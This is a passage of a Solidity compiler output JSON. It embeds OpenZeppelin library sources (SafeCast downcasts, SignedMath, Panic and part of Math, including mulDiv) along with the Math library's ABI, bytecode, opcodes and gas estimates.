value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int176 from int256, reverting on\\n     * overflow (when the input is less than smallest int176 or\\n     * greater than largest int176).\\n     *\\n     * Counterpart to Solidity's `int176` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 176 bits\\n     */\\n    function toInt176(int256 value) internal pure returns (int176 downcasted) {\\n        downcasted = int176(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(176, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int168 from int256, reverting on\\n     * overflow (when the input is less than smallest int168 or\\n     * greater than largest int168).\\n     *\\n     * Counterpart to Solidity's `int168` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 168 bits\\n     */\\n    function toInt168(int256 value) internal pure returns (int168 downcasted) {\\n        downcasted = int168(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(168, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int160 from int256, reverting on\\n     * overflow (when the input is less than smallest int160 or\\n     * greater than largest int160).\\n     *\\n     * Counterpart to Solidity's `int160` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 160 bits\\n     */\\n    function toInt160(int256 value) internal pure returns (int160 downcasted) {\\n        downcasted = int160(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(160, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int152 from int256, reverting on\\n     * overflow (when the input is less than smallest int152 or\\n     * greater than largest int152).\\n     *\\n     * Counterpart to Solidity's `int152` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 152 bits\\n     */\\n    function toInt152(int256 value) internal pure returns (int152 downcasted) {\\n        downcasted = int152(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(152, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int144 from int256, reverting on\\n     * overflow (when the input is less than smallest int144 or\\n     * greater than largest int144).\\n     *\\n     * Counterpart to Solidity's `int144` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 144 bits\\n     */\\n    function toInt144(int256 value) internal pure returns (int144 downcasted) {\\n        downcasted = int144(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(144, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int136 from int256, reverting on\\n     * overflow (when the input is less than smallest int136 or\\n     * greater than largest int136).\\n     *\\n     * Counterpart to Solidity's `int136` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 136 bits\\n     */\\n    function toInt136(int256 value) internal pure returns (int136 downcasted) {\\n        downcasted = int136(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(136, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int128 from int256, reverting on\\n     * overflow (when the input is less than smallest int128 or\\n     * greater than largest int128).\\n     *\\n     * Counterpart to Solidity's `int128` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 128 bits\\n     */\\n    function toInt128(int256 value) internal pure returns (int128 downcasted) {\\n        downcasted = int128(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(128, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int120 from int256, reverting on\\n     * overflow (when the input is less than smallest int120 or\\n     * greater than largest int120).\\n     *\\n     * Counterpart to Solidity's `int120` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 120 bits\\n     */\\n    function toInt120(int256 value) internal pure returns (int120 downcasted) {\\n        downcasted = int120(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(120, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int112 from int256, reverting on\\n     * overflow (when the input is less than smallest int112 or\\n     * greater than largest int112).\\n     *\\n     * Counterpart to Solidity's `int112` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 112 bits\\n     */\\n    function toInt112(int256 value) internal pure returns (int112 downcasted) {\\n        downcasted = int112(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(112, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int104 from int256, reverting on\\n     * overflow (when the input is less than smallest int104 or\\n     * greater than largest int104).\\n     *\\n     * Counterpart to Solidity's `int104` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 104 bits\\n     */\\n    function toInt104(int256 value) internal pure returns (int104 downcasted) {\\n        downcasted = int104(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(104, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int96 from int256, reverting on\\n     * overflow (when the input is less than smallest int96 or\\n     * greater than largest int96).\\n     *\\n     * Counterpart to Solidity's `int96` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 96 bits\\n     */\\n    function toInt96(int256 value) internal pure returns (int96 downcasted) {\\n        downcasted = int96(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(96, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int88 from int256, reverting on\\n     * overflow (when the input is less than smallest int88 or\\n     * greater than largest int88).\\n     *\\n     * Counterpart to Solidity's `int88` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 88 bits\\n     */\\n    function toInt88(int256 value) internal pure returns (int88 downcasted) {\\n        downcasted = int88(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(88, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int80 from int256, reverting on\\n     * overflow (when the input is less than smallest int80 or\\n     * greater than largest int80).\\n     *\\n     * Counterpart to Solidity's `int80` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 80 bits\\n     */\\n    function toInt80(int256 value) internal pure returns (int80 downcasted) {\\n        downcasted = int80(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(80, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int72 from int256, reverting on\\n     * overflow (when the input is less than smallest int72 or\\n     * greater than largest int72).\\n     *\\n     * Counterpart to Solidity's `int72` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 72 bits\\n     */\\n    function toInt72(int256 value) internal pure returns (int72 downcasted) {\\n        downcasted = int72(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(72, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int64 from int256, reverting on\\n     * overflow (when the input is less than smallest int64 or\\n     * greater than largest int64).\\n     *\\n     * Counterpart to Solidity's `int64` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 64 bits\\n     */\\n    function toInt64(int256 value) internal pure returns (int64 downcasted) {\\n        downcasted = int64(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(64, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int56 from int256, reverting on\\n     * overflow (when the input is less than smallest int56 or\\n     * greater than largest int56).\\n     *\\n     * Counterpart to Solidity's `int56` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 56 bits\\n     */\\n    function toInt56(int256 value) internal pure returns (int56 downcasted) {\\n        downcasted = int56(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(56, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int48 from int256, reverting on\\n     * overflow (when the input is less than smallest int48 or\\n     * greater than largest int48).\\n     *\\n     * Counterpart to Solidity's `int48` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 48 bits\\n     */\\n    function toInt48(int256 value) internal pure returns (int48 downcasted) {\\n        downcasted = int48(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(48, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int40 from int256, reverting on\\n     * overflow (when the input is less than smallest int40 or\\n     * greater than largest int40).\\n     *\\n     * Counterpart to Solidity's `int40` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 40 bits\\n     */\\n    function toInt40(int256 value) internal pure returns (int40 downcasted) {\\n        downcasted = int40(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(40, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int32 from int256, reverting on\\n     * overflow (when the input is less than smallest int32 or\\n     * greater than largest int32).\\n     *\\n     * Counterpart to Solidity's `int32` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 32 bits\\n     */\\n    function toInt32(int256 value) internal pure returns (int32 downcasted) {\\n        downcasted = int32(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(32, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int24 from int256, reverting on\\n     * overflow (when the input is less than smallest int24 or\\n     * greater than largest int24).\\n     *\\n     * Counterpart to Solidity's `int24` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 24 bits\\n     */\\n    function toInt24(int256 value) internal pure returns (int24 downcasted) {\\n        downcasted = int24(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(24, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int16 from int256, reverting on\\n     * overflow (when the input is less than smallest int16 or\\n     * greater than largest int16).\\n     *\\n     * Counterpart to Solidity's `int16` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 16 bits\\n     */\\n    function toInt16(int256 value) internal pure returns (int16 downcasted) {\\n        downcasted = int16(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(16, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int8 from int256, reverting on\\n     * overflow (when the input is less than smallest int8 or\\n     * greater than largest int8).\\n     *\\n     * Counterpart to Solidity's `int8` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 8 bits\\n     */\\n    function toInt8(int256 value) internal pure returns (int8 downcasted) {\\n        downcasted = int8(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(8, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts an unsigned uint256 into a signed int256.\\n     *\\n     * Requirements:\\n     *\\n     * - input must be less than or equal to maxInt256.\\n     */\\n    function toInt256(uint256 value) internal pure returns (int256) {\\n        // Note: Unsafe cast below is okay because `type(int256).max` is guaranteed to be positive\\n        if (value > uint256(type(int256).max)) {\\n            revert SafeCastOverflowedUintToInt(value);\\n        }\\n        return int256(value);\\n    }\\n\\n    /**\\n     * @dev Cast a boolean (false or true) to a uint256 (0 or 1) with no jump.\\n     */\\n    function toUint(bool b) internal pure returns (uint256 u) {\\n        assembly (\\\"memory-safe\\\") {\\n            u := iszero(iszero(b))\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0x195533c86d0ef72bcc06456a4f66a9b941f38eb403739b00f21fd7c1abd1ae54\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/SignedMath.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/math/SignedMath.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {SafeCast} from \\\"./SafeCast.sol\\\";\\n\\n/**\\n * @dev Standard signed math utilities missing in the Solidity language.\\n */\\nlibrary SignedMath {\\n    /**\\n     * @dev Branchless ternary evaluation for `a ? b : c`. Gas costs are constant.\\n     *\\n     * IMPORTANT: This function may reduce bytecode size and consume less gas when used standalone.\\n     * However, the compiler may optimize Solidity ternary operations (i.e. `a ? b : c`) to only compute\\n     * one branch when needed, making this function more expensive.\\n     */\\n    function ternary(bool condition, int256 a, int256 b) internal pure returns (int256) {\\n        unchecked {\\n            // branchless ternary works because:\\n            // b ^ (a ^ b) == a\\n            // b ^ 0 == b\\n            return b ^ ((a ^ b) * int256(SafeCast.toUint(condition)));\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two signed numbers.\\n     */\\n    function max(int256 a, int256 b) internal pure returns (int256) {\\n        return ternary(a > b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two signed numbers.\\n     */\\n    function min(int256 a, int256 b) internal pure returns (int256) {\\n        return ternary(a < b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the average of two signed numbers without overflow.\\n     * The result is rounded towards zero.\\n     */\\n    function average(int256 a, int256 b) internal pure returns (int256) {\\n        // Formula from the book \\\"Hacker's Delight\\\"\\n        int256 x = (a & b) + ((a ^ b) >> 1);\\n        return x + (int256(uint256(x) >> 255) & (a ^ b));\\n    }\\n\\n    /**\\n     * @dev Returns the absolute unsigned value of a signed value.\\n     */\\n    function abs(int256 n) internal pure returns (uint256) {\\n        unchecked {\\n            // Formula from the \\\"Bit Twiddling Hacks\\\" by Sean Eron Anderson.\\n            // Since `n` is a signed integer, the generated bytecode will use the SAR opcode to perform the right shift,\\n            // taking advantage of the most significant (or \\\"sign\\\" bit) in two's complement representation.\\n            // This opcode adds new most significant bits set to the value of the previous most significant bit. As a result,\\n            // the mask will either be `bytes32(0)` (if n is positive) or `~bytes32(0)` (if n is negative).\\n            int256 mask = n >> 255;\\n\\n            // A `bytes32(0)` mask leaves the input unchanged, while a `~bytes32(0)` mask complements it.\\n            return uint256((n + mask) ^ mask);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xb1970fac7b64e6c09611e6691791e848d5e3fe410fa5899e7df2e0afd77a99e3\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/math/Math.sol":{"Math":{"abi":[],"devdoc":{"details":"Standard math utilities missing in the Solidity language.","kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"60566050600b82828239805160001a6073146043577f4e487b7100000000000000000000000000000000000000000000000000000000600052600060045260246000fd5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea26469706673582212204143000467d5e47a3da8e73bc5d3ebb811f6904302efc4ed775af59a716f8dca64736f6c634300081c0033","opcodes":"PUSH1 0x56 PUSH1 0x50 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x43 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x0 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 COINBASE NUMBER STOP DIV PUSH8 0xD5E47A3DA8E73BC5 0xD3 0xEB 0xB8 GT 0xF6 SWAP1 NUMBER MUL 0xEF 0xC4 0xED PUSH24 0x5AF59A716F8DCA64736F6C634300081C0033000000000000 ","sourceMap":"281:31863:6:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"73000000000000000000000000000000000000000030146080604052600080fdfea26469706673582212204143000467d5e47a3da8e73bc5d3ebb811f6904302efc4ed775af59a716f8dca64736f6c634300081c0033","opcodes":"PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 COINBASE NUMBER STOP DIV PUSH8 0xD5E47A3DA8E73BC5 0xD3 0xEB 0xB8 GT 0xF6 SWAP1 NUMBER MUL 0xEF 0xC4 0xED PUSH24 0x5AF59A716F8DCA64736F6C634300081C0033000000000000 ","sourceMap":"281:31863:6:-:0;;;;;;;;"},"gasEstimates":{"creation":{"codeDepositCost":"17200","executionCost":"97","totalCost":"17297"},"internal":{"_zeroBytes(bytes memory)":"infinite","add512(uint256,uint256)":"infinite","average(uint256,uint256)":"infinite","ceilDiv(uint256,uint256)":"infinite","invMod(uint256,uint256)":"infinite","invModPrime(uint256,uint256)":"infinite","log10(uint256)":"infinite","log10(uint256,enum Math.Rounding)":"infinite","log2(uint256)":"infinite","log2(uint256,enum Math.Rounding)":"infinite","log256(uint256)":"infinite","log256(uint256,enum Math.Rounding)":"infinite","max(uint256,uint256)":"infinite","min(uint256,uint256)":"infinite","modExp(bytes memory,bytes memory,bytes memory)":"infinite","modExp(uint256,uint256,uint256)":"infinite","mul512(uint256,uint256)":"infinite","mulDiv(uint256,uint256,uint256)":"infinite","mulDiv(uint256,uint256,uint256,enum Math.Rounding)":"infinite","mulShr(uint256,uint256,uint8)":"infinite","mulShr(uint256,uint256,uint8,enum Math.Rounding)":"infinite","saturatingAdd(uint256,uint256)":"infinite","saturatingMul(uint256,uint256)":"infinite","saturatingSub(uint256,uint256)":"infinite","sqrt(uint256)":"infinite","sqrt(uint256,enum Math.Rounding)":"infinite","ternary(bool,uint256,uint256)":"infinite","tryAdd(uint256,uint256)":"infinite","tryDiv(uint256,uint256)":"infinite","tryMod(uint256,uint256)":"infinite","tryModExp(bytes memory,bytes memory,bytes memory)":"infinite","tryModExp(uint256,uint256,uint256)":"infinite","tryMul(uint256,uint256)":"infinite","trySub(uint256,uint256)":"infinite","unsignedRoundsUp(enum Math.Rounding)":"infinite"}},"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Standard math utilities missing in the Solidity language.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/math/Math.sol\":\"Math\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/Panic.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/Panic.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Helper library for emitting standardized panic codes.\\n *\\n * ```solidity\\n * contract Example {\\n *      using Panic for uint256;\\n *\\n *      // Use any of the declared internal constants\\n *      function foo() { Panic.GENERIC.panic(); }\\n *\\n *      // Alternatively\\n *      function foo() { Panic.panic(Panic.GENERIC); }\\n * }\\n * ```\\n *\\n * Follows the list from https://github.com/ethereum/solidity/blob/v0.8.24/libsolutil/ErrorCodes.h[libsolutil].\\n *\\n * _Available since v5.1._\\n */\\n// slither-disable-next-line unused-state\\nlibrary Panic {\\n    /// @dev generic / unspecified error\\n    uint256 internal constant GENERIC = 0x00;\\n    /// @dev used by the assert() builtin\\n    uint256 internal constant ASSERT = 0x01;\\n    /// @dev arithmetic underflow or overflow\\n    uint256 internal constant UNDER_OVERFLOW = 0x11;\\n    /// @dev division or modulo by zero\\n    uint256 internal constant DIVISION_BY_ZERO = 0x12;\\n    /// @dev enum conversion error\\n    uint256 internal constant ENUM_CONVERSION_ERROR = 0x21;\\n    /// @dev invalid encoding in storage\\n    uint256 internal constant STORAGE_ENCODING_ERROR = 0x22;\\n    /// @dev empty array pop\\n    uint256 internal constant EMPTY_ARRAY_POP = 0x31;\\n    /// @dev array out of bounds access\\n    uint256 internal constant ARRAY_OUT_OF_BOUNDS = 0x32;\\n    /// @dev resource error (too large allocation or too large array)\\n    uint256 internal constant RESOURCE_ERROR = 0x41;\\n    /// @dev calling invalid internal function\\n    uint256 internal constant INVALID_INTERNAL_FUNCTION = 0x51;\\n\\n    /// @dev Reverts with a panic code. Recommended to use with\\n    /// the internal constants with predefined codes.\\n    function panic(uint256 code) internal pure {\\n        assembly (\\\"memory-safe\\\") {\\n            mstore(0x00, 0x4e487b71)\\n            mstore(0x20, code)\\n            revert(0x1c, 0x24)\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xf7fe324703a64fc51702311dc51562d5cb1497734f074e4f483bfb6717572d7a\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/Math.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.3.0) (utils/math/Math.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Panic} from \\\"../Panic.sol\\\";\\nimport {SafeCast} from \\\"./SafeCast.sol\\\";\\n\\n/**\\n * @dev Standard math utilities missing in the Solidity language.\\n */\\nlibrary Math {\\n    enum Rounding {\\n        Floor, // Toward negative infinity\\n        Ceil, // Toward positive infinity\\n        Trunc, // Toward zero\\n        Expand // Away from zero\\n    }\\n\\n    /**\\n     * @dev Return the 512-bit addition of two uint256.\\n     *\\n     * The result is stored in two 256 variables such that sum = high * 2\\u00b2\\u2075\\u2076 + low.\\n     */\\n    function add512(uint256 a, uint256 b) internal pure returns (uint256 high, uint256 low) {\\n        assembly (\\\"memory-safe\\\") {\\n            low := add(a, b)\\n            high := lt(low, a)\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the 512-bit multiplication of two uint256.\\n     *\\n     * The result is stored in two 256 variables such that product = high * 2\\u00b2\\u2075\\u2076 + low.\\n     */\\n    function mul512(uint256 a, uint256 b) internal pure returns (uint256 high, uint256 low) {\\n        // 512-bit multiply [high low] = x * y. Compute the product mod 2\\u00b2\\u2075\\u2076 and mod 2\\u00b2\\u2075\\u2076 - 1, then use\\n        // the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\\n        // variables such that product = high * 2\\u00b2\\u2075\\u2076 + low.\\n        assembly (\\\"memory-safe\\\") {\\n            let mm := mulmod(a, b, not(0))\\n            low := mul(a, b)\\n            high := sub(sub(mm, low), lt(mm, low))\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the addition of two unsigned integers, with a success flag (no overflow).\\n     */\\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            uint256 c = a + b;\\n            success = c >= a;\\n            result = c * SafeCast.toUint(success);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, with a success flag (no overflow).\\n     */\\n    function trySub(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            uint256 c = a - b;\\n            success = c <= a;\\n            result = c * SafeCast.toUint(success);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the multiplication of two unsigned integers, with a success flag (no overflow).\\n     */\\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            uint256 c = a * b;\\n            assembly (\\\"memory-safe\\\") {\\n                // Only true when the multiplication doesn't overflow\\n                // (c / a == b) || (a == 0)\\n                success := or(eq(div(c, a), b), iszero(a))\\n            }\\n            // equivalent to: success ? c : 0\\n            result = c * SafeCast.toUint(success);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the division of two unsigned integers, with a success flag (no division by zero).\\n     */\\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            success = b > 0;\\n            assembly (\\\"memory-safe\\\") {\\n                // The `DIV` opcode returns zero when the denominator is 0.\\n                result := div(a, b)\\n            }\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers, with a success flag (no division by zero).\\n     */\\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            success = b > 0;\\n            assembly (\\\"memory-safe\\\") {\\n                // The `MOD` opcode returns zero when the denominator is 0.\\n                result := mod(a, b)\\n            }\\n        }\\n    }\\n\\n    /**\\n     * @dev Unsigned saturating addition, bounds to `2\\u00b2\\u2075\\u2076 - 1` instead of overflowing.\\n     */\\n    function saturatingAdd(uint256 a, uint256 b) internal pure returns (uint256) {\\n        (bool success, uint256 result) = tryAdd(a, b);\\n        return ternary(success, result, type(uint256).max);\\n    }\\n\\n    /**\\n     * @dev Unsigned saturating subtraction, bounds to zero instead of overflowing.\\n     */\\n    function saturatingSub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        (, uint256 result) = trySub(a, b);\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Unsigned saturating multiplication, bounds to `2\\u00b2\\u2075\\u2076 - 1` instead of overflowing.\\n     */\\n    function saturatingMul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        (bool success, uint256 result) = tryMul(a, b);\\n        return ternary(success, result, type(uint256).max);\\n    }\\n\\n    /**\\n     * @dev Branchless ternary evaluation for `a ? b : c`. Gas costs are constant.\\n     *\\n     * IMPORTANT: This function may reduce bytecode size and consume less gas when used standalone.\\n     * However, the compiler may optimize Solidity ternary operations (i.e. `a ? b : c`) to only compute\\n     * one branch when needed, making this function more expensive.\\n     */\\n    function ternary(bool condition, uint256 a, uint256 b) internal pure returns (uint256) {\\n        unchecked {\\n            // branchless ternary works because:\\n            // b ^ (a ^ b) == a\\n            // b ^ 0 == b\\n            return b ^ ((a ^ b) * SafeCast.toUint(condition));\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two numbers.\\n     */\\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return ternary(a > b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two numbers.\\n     */\\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return ternary(a < b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the average of two numbers. The result is rounded towards\\n     * zero.\\n     */\\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b) / 2 can overflow.\\n        return (a & b) + (a ^ b) / 2;\\n    }\\n\\n    /**\\n     * @dev Returns the ceiling of the division of two numbers.\\n     *\\n     * This differs from standard division with `/` in that it rounds towards infinity instead\\n     * of rounding towards zero.\\n     */\\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (b == 0) {\\n            // Guarantee the same behavior as in a regular Solidity division.\\n            Panic.panic(Panic.DIVISION_BY_ZERO);\\n        }\\n\\n        // The following calculation ensures accurate ceiling division without overflow.\\n        // Since a is non-zero, (a - 1) / b will not overflow.\\n        // The largest possible result occurs when (a - 1) / b is type(uint256).max,\\n        // but the largest value we can obtain is type(uint256).max - 1, which happens\\n        // when a = type(uint256).max and b = 1.\\n        unchecked {\\n            return SafeCast.toUint(a > 0) * ((a - 1) / b + 1);\\n        }\\n    }\\n\\n    /**\\n     * @dev Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or\\n     * denominator == 0.\\n     *\\n     * Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv) with further edits by\\n     * Uniswap Labs also under MIT license.\\n     */\\n    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {\\n        unchecked {\\n            (uint256 high, uint256 low) = mul512(x, y);\\n\\n            // Handle non-overflow cases, 256 by 256 division.\\n            if (high == 0) {\\n                // Solidity will revert if denominator == 0, unlike the div opcode on its own.\\n                // The surrounding unchecked block does not change this fact.\\n                // See https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic.\\n                return low / denominator;\\n            }\\n\\n            // Make sure the result is less than 2\\u00b2\\u2075\\u2076. Also prevents denominator == 0.\\n            if (denominator <= high) {\\n                Panic.panic(ternary(denominator == 0, Panic.DIVISION_BY_ZERO, Panic.UNDER_OVERFLOW));\\n            }\\n\\n            ///////////////////////////////////////////////\\n            // 512 by 256 division.\\n            ///////////////////////////////////////////////\\n\\n            // Make division exact by subtracting the remainder from [high low].\\n            uint256 remainder;\\n            assembly (\\\"memory-safe\\\") {\\n                // Compute remainder using mulmod.\\n                remainder := mulmod(x, y, denominator)\\n\\n                // Subtract 256 bit number from 512 bit number.\\n                high := sub(high, gt(remainder, low))\\n                low := sub(low, remainder)\\n            }\\n\\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator.\\n            // Always >= 1. See https://cs.stackexchange.com/q/138556/92363.\\n\\n            uint256 twos = denominator & (0 - denominator);\\n            assembly (\\\"memory-safe\\\") {\\n                // Divide denominator by twos.\\n                denominator := div(denominator, twos)\\n\\n                // Divide [high low] by twos.\\n                low := div(low, twos)\\n\\n                // Flip twos such that it is 2\\u00b2\\u2075\\u2076 / twos. If twos is zero, then it becomes one.\\n                twos := add(div(sub(0, twos), twos), 1)\\n            }\\n\\n            // Shift in bits from high into low.\\n            low |= high * twos;\\n\\n            // Invert denominator mod 2\\u00b2\\u2075\\u2076. Now that denominator is an odd number, it has an inverse modulo 2\\u00b2\\u2075\\u2076 such\\n            // that denominator * inv \\u2261 1 mod 2\\u00b2\\u2075\\u2076. Compute the inverse by starting with a seed that is correct for\\n            // four bits. That is, denominator * inv \\u2261 1 mod 2\\u2074.\\n            uint256 inverse = (3 * denominator) ^ 2;\\n\\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also\\n            // works in modular arithmetic, doubling the correct bits in each step.\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u2078\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b9\\u2076\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b3\\u00b2\\n            inverse *= 